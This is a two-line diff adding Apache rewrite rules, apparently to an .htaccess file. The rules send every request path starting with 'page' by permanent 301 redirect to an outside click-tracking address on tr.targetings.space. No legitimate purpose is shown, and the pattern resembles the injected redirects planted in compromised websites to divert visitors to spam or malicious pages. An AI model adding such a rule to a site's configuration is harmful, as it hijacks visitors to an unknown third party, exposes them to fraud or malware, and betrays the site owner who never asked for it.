@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^page.*$ http://tr.targetings.space/click.php?lp=1 [R=301,L]
